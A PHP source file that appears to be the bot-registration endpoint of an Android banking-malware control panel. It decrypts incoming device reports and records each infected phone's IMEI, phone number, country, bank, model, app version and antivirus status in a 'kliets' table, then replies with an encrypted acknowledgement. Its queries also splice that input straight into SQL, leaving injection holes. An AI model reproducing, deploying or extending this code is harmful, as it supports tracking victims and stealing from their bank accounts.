<?php
$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include 'crypt.php';
include 'config.php';
$request = decrypt($request,cryptKey);

//echo encrypt("sssssss","qSeADfgzxR");
//echo decrypt("SSf SSf SSf SSf SSf SSf SSf","qSeADfgzxR");


$request=str_replace(":)",")",$request);

$massivReq = explode(":", $request);
$IMEI = $massivReq[0]; 
$phoneNumber = $massivReq[1]; 
$Version = $massivReq[2]; 
$country =$massivReq[3]; 
$bank = $massivReq[4]; 
$model = $massivReq[5]; 
$Version_apk = $massivReq[6]; 
$AV = $massivReq[7]; 

$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');
$sql = "SELECT * FROM kliets WHERE IMEI='$IMEI'";

$booleanIMEI = false;
foreach($connection->query($sql) as $row)
{
	if($row['IMEI']==$IMEI)
	{
		$booleanIMEI=true;	
		break;
	}
}
if($booleanIMEI == false)
{
	$data = date('Y-m-d H:i');
	$add_data = $connection->exec("insert into kliets (IMEI,number,version,country,bank,model,lastConnect,firstConnect,version_apk,av) 
	value ('$IMEI','$phoneNumber','$Version','$country','$bank','$model','$data','$data','$Version_apk','$AV')");
	
	//Создаем файл для ведение ЛОГов!
	//$path_log = "logs/$IMEI.log";
	//file_put_contents($path_log, PHP_EOL.'', FILE_APPEND);

	//	id 	IMEI 	number 	version 	country 	bank 	model 	lastConnect 	firstConnect 
//	echo "IMEI: $IMEI Номер: $phoneNumber Версия: $Version Страна: $country	Банк: $bank Модель:  $model";

	$tag = "<tag>";
	$otv = encrypt("|OK|",cryptKey);
	$tagend = "</tag>";

	echo "$tag$otv$tagend";
}
else
{
	$tag = "<tag>";
	$otv = encrypt("|NO|",cryptKey);;
	$tagend = "</tag>";

	echo "$tag$otv$tagend";
	//echo "<tag>|NO|</tag>";
}
?>